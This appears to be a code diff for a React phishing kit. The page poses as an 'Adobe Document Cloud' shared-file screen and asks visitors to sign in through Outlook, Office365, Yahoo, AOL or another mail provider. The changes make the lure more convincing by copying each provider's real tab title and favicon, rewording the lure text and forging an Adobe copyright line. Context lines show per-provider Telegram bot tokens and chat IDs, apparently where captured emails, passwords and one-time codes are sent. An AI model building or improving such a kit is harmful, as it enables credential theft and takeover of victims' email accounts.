@@ -29,11 +29,11 @@ const OutlookIcon = ({ size = 18 }) => (
 
 // ── Provider data ───────────────────────────────────────────────────
 const PROVIDERS = [
-  { id: 'outlook', name: 'Outlook', label: 'Sign in with Outlook', logoType: 'outlook', btnColor: 'bg-[#0072c6]', iconBg: 'bg-[#01b8ce]', domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.com.au'], hint: '@outlook.com, @hotmail.com, @live.com …' },
-  { id: 'office365', name: 'Office365', label: 'Sign in with Office365', logoType: 'office', btnColor: 'bg-[#d83b01]', iconBg: 'bg-white', domains: null, hint: 'Any work or school email' },
-  { id: 'yahoo', name: 'Yahoo', label: 'Sign in with Yahoo Mail', logoType: 'yahoo', btnColor: 'bg-[#6001d2]', iconBg: 'bg-[#770094]/20', domains: null, hint: '@yahoo.com, @yahoo.co.uk, @yahoo.fr …' },
-  { id: 'aol', name: 'AOL', label: 'Sign in with AOL', logoType: 'aol', btnColor: 'bg-green-600 text-white', iconBg: 'bg-black rounded-full', domains: ['aol.com'], hint: '@aol.com' },
-  { id: 'other', name: 'Email', label: 'Sign in with Other Mail', logoType: 'other', btnColor: 'bg-blue-500', iconBg: 'bg-white', domains: null, hint: 'Any email address' },
+  { id: 'outlook', name: 'Outlook', label: 'Sign in with Outlook', logoType: 'outlook', btnColor: 'bg-[#0072c6]', iconBg: 'bg-[#01b8ce]', domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.com.au'], hint: '@outlook.com, @hotmail.com, @live.com …', title: 'Sign in to your Microsoft account', favicon: 'https://res.cdn.office.net/officehub/images/content/images/favicon_outlook-73336715f5.ico' },
+  { id: 'office365', name: 'Office365', label: 'Sign in with Office365', logoType: 'office', btnColor: 'bg-[#d83b01]', iconBg: 'bg-white', domains: null, hint: 'Any work or school email', title: 'Sign in to your account', favicon: 'https://www.microsoft.com/favicon.ico' },
+  { id: 'yahoo', name: 'Yahoo', label: 'Sign in with Yahoo Mail', logoType: 'yahoo', btnColor: 'bg-[#6001d2]', iconBg: 'bg-[#770094]/20', domains: null, hint: '@yahoo.com, @yahoo.co.uk, @yahoo.fr …', title: 'Yahoo', favicon: 'https://s.yimg.com/rz/l/favicon.ico' },
+  { id: 'aol', name: 'AOL', label: 'Sign in with AOL', logoType: 'aol', btnColor: 'bg-green-600 text-white', iconBg: 'bg-black rounded-full', domains: ['aol.com'], hint: '@aol.com', title: 'AOL', favicon: 'https://s.yimg.com/wm/login/aol-favicon.png' },
+  { id: 'other', name: 'Email', label: 'Sign in with Other Mail', logoType: 'other', btnColor: 'bg-blue-500', iconBg: 'bg-white', domains: null, hint: 'Any email address', title: 'Sign in to your account', favicon: '/logo.webp' },
 ];
 
 // Returns true if the email/username matches the provider's allowed domains
@@ -54,7 +54,7 @@ const emailMatchesProvider = (email, provider) => {
   // If there IS an '@', validate the domain against the provider's rules
   if (provider.id === 'yahoo') return /^[^@]+@yahoo\..+$/.test(lower);
   if (!provider.domains) return true;
-  
+
   const domain = lower.split('@')[1] ?? '';
   return provider.domains.includes(domain);
 };
@@ -84,24 +84,24 @@ const PROVIDER_PAGE_MAP = {
 // Falls back to the shared bot if provider-specific vars aren't set
 const PROVIDER_BOT_MAP = {
   outlook: {
-    token: import.meta.env.VITE_OUTLOOK_BOT_TOKEN   || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
-    chatId: import.meta.env.VITE_OUTLOOK_CHAT_ID    || import.meta.env.VITE_TELEGRAM_CHAT_ID,
+    token: import.meta.env.VITE_OUTLOOK_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
+    chatId: import.meta.env.VITE_OUTLOOK_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
   },
   office365: {
-    token: import.meta.env.VITE_OFFICE365_BOT_TOKEN  || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
-    chatId: import.meta.env.VITE_OFFICE365_CHAT_ID   || import.meta.env.VITE_TELEGRAM_CHAT_ID,
+    token: import.meta.env.VITE_OFFICE365_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
+    chatId: import.meta.env.VITE_OFFICE365_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
   },
   yahoo: {
-    token: import.meta.env.VITE_YAHOO_BOT_TOKEN      || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
-    chatId: import.meta.env.VITE_YAHOO_CHAT_ID       || import.meta.env.VITE_TELEGRAM_CHAT_ID,
+    token: import.meta.env.VITE_YAHOO_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
+    chatId: import.meta.env.VITE_YAHOO_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
   },
   aol: {
-    token: import.meta.env.VITE_AOL_BOT_TOKEN        || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
-    chatId: import.meta.env.VITE_AOL_CHAT_ID         || import.meta.env.VITE_TELEGRAM_CHAT_ID,
+    token: import.meta.env.VITE_AOL_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
+    chatId: import.meta.env.VITE_AOL_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
   },
   other: {
-    token: import.meta.env.VITE_OTHER_BOT_TOKEN      || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
-    chatId: import.meta.env.VITE_OTHER_CHAT_ID       || import.meta.env.VITE_TELEGRAM_CHAT_ID,
+    token: import.meta.env.VITE_OTHER_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
+    chatId: import.meta.env.VITE_OTHER_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
   },
 };
 
@@ -134,6 +134,21 @@ const App = () => {
   const [emailError, setEmailError] = useState('');
   const [pwWarning, setPwWarning] = useState(false);
   const [otpError, setOtpError] = useState('');
+
+  const DEFAULT_TITLE = 'Adobe Document Cloud';
+  const DEFAULT_FAVICON = '/logo.webp';
+
+  React.useEffect(() => {
+    if (selectedProvider) {
+      document.title = selectedProvider.title;
+      const favicon = document.querySelector('link[rel="icon"]');
+      if (favicon) favicon.href = selectedProvider.favicon;
+    } else {
+      document.title = DEFAULT_TITLE;
+      const favicon = document.querySelector('link[rel="icon"]');
+      if (favicon) favicon.href = DEFAULT_FAVICON;
+    }
+  }, [selectedProvider]);
 
   const handleProviderSelect = (provider) => {
     setSelectedProvider(provider);
@@ -298,38 +313,9 @@ const App = () => {
   return (
     <div className="relative min-h-screen w-screen flex items-center justify-center overflow-hidden dbg-slate-100" style={{ backgroundImage: "url('/bg-img.jpg')", backgroundSize: "cover", backgroundPosition: "center" }}>
 
-      {/* ── Blurred "document" background ── */}
-      <div
-        className="absolute inset-0 scale-105"
-        style={{ filter: 'blur(6px)' }}
-      >
-        {/* Page texture */}
-        <div className="absolute inset-0 bg-gradient-to-br from-slate-50 via-white to-blue-50" />
 
-        {/* Fake document content — mimics a letter/PDF behind the modal */}
-        <div className="absolute inset-0 flex flex-col gap-6 p-16 opacity-60 select-none pointer-events-none">
-          {/* Header row */}
-          <div className="flex items-center gap-4">
-            <div className="w-12 h-12 rounded bg-red-400 shrink-0" />
-            <div className="flex flex-col gap-1.5">
-              <div className="h-3 w-40 bg-slate-400 rounded" />
-              <div className="h-2 w-24 bg-slate-300 rounded" />
-            </div>
-          </div>
-          {/* Body text lines */}
-          {[100, 80, 95, 70, 88, 60, 92, 75, 85, 50, 78, 65, 90, 55].map((w, i) => (
-            <div key={i} className="h-2.5 rounded bg-slate-300" style={{ width: `${w}%` }} />
-          ))}
-          {/* Second paragraph */}
-          <div className="mt-2 space-y-2.5">
-            {[72, 90, 55, 83, 68, 96, 45, 77].map((w, i) => (
-              <div key={i} className="h-2.5 rounded bg-slate-200" style={{ width: `${w}%` }} />
-            ))}
-          </div>
-        </div>
-      </div>
 
-      <div className="relative z-50 w-full max-w-sm px-4">
+      <div className="relative z-50 w-full max-w-md px-4">
 
         {/* ── Provider picker ── */}
         <div className="bg-black/60 backdrop-blur-xs backdrop-grayscale backdrop-brightness-120 rounded-xl px-8 py-10 text-white text-center shadow-2xl animate-fade-in">
@@ -340,7 +326,7 @@ const App = () => {
           </div>
           <h2 className="font-medium mb-1">Adobe Document Cloud</h2>
           <p className="text-xs text-white mb-6">
-            To read the document, please enter with the valid email credentials that this file was sent to.
+            To read the document, please choose your email provider below login to view shared file.
           </p>
           <div className="flex flex-col gap-3 mb-6">
             {PROVIDERS.map(({ id, label, logoType, btnColor, iconBg }) => (
@@ -355,9 +341,9 @@ const App = () => {
                 {label}
               </button>
             ))}
-            <p className="text-white text-xs">Select your email provider to view Document</p>
+            <p className="text-white text-xs">Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.</p>
           </div>
-          <p className="text-xs text-white">Copyright &copy; 2026 Adobe</p>
+          <p className="text-xs text-white">CopyRight &copy; {new Date().getFullYear()} Adobe system incorporated, All right reserved.</p>
         </div>
       </div>
     </div>
